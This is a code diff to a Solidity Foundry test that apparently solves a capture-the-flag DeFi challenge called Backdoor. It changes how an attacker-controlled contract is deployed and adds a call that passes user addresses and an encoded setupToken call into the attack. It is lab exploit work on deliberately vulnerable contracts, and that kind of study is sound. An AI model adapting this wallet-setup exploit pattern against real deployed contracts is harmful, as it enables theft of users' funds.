@@ -85,6 +85,7 @@ contract Backdoor is Test {
         console.log(attacker);
 
         vm.startPrank(attacker);
+        // vm.startBroadcast(attacker);
 
         // Deploy the attack contract
         AttackBackdoor attackBackDoor = new AttackBackdoor(
@@ -92,11 +93,14 @@ contract Backdoor is Test {
             address(masterCopy),
             address(dvt),
             address(walletFactory),
-            address(walletRegistry),
-            users,
-            abi.encodeWithSignature("setupToken()")
+            address(walletRegistry)
         );
 
+        attackBackDoor.attack(
+            users, abi.encodeWithSignature("setupToken(address,address)", address(dvt), address(attackBackDoor))
+        );
+
+        // vm.stopBroadcast();
         vm.stopPrank();
 
         /**
